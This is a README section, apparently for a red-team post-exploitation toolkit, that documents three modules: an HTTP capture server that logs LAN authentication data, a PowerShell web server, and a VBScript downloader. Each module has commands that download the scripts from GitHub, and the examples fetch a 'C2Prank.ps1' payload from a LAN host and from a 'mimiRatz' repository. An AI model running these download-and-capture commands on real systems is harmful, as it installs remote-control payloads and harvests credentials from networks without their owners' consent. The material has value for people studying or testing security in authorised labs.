## Module Name
   <b><i>CaptureServer.ps1</i></b>

|Function name|Description|Privileges|Notes|
|---|---|---|---|
|CaptureServer|Captute HTTP local lan data (logile)|Administrator|Administrator privileges required|

```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/HTTP-Server/CaptureServer.ps1" -OutFile "CaptureServer.ps1"
```

```powershell
Import-Module -Name .\CaptureServer.ps1 -Force
CaptureServer -AuthType Basic -IPAddress 192.168.1.72 -LogFilePath $Env:TMP\logfile.txt
```

<br />

## Module Name
   <b><i>Start-SimpleHTTPServer.ps1</i></b>
   
|Function Name|Description|Privileges|Notes|
|---|---|---|---|
|Start-SimpleHTTPServer|Simple HTTP pure powershell webserver|Administrator|Current directory its used as webroot|

```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/HTTP-Server/Start-SimpleHTTPServer.ps1" -OutFile "Start-SimpleHTTPServer.ps1"
```

```powershell      
Import-Module -Name .\Start-SimpleHTTPServer.ps1 -Force
Start-SimpleHTTPServer -port 8080
```   

<br />

## Module Name
   <b><i>wget.vbs</i></b>
   
|Script Name|Description|Privileges|Notes|
|---|---|---|---|
|wget.vbs|VBScript to download files from Local Lan|User Land|can be executed using **'cscript'** or **'powershell'** interpreter|

```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/HTTP-Server/wget.vbs" -OutFile "wget.vbs"
```

```powershell      
cscript wget.vbs http://10.11.0.5/C2Prank.ps1 C2Prank.ps1
.\wget.vbs https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/C2Prank.ps1 C2Prank.ps1
```  
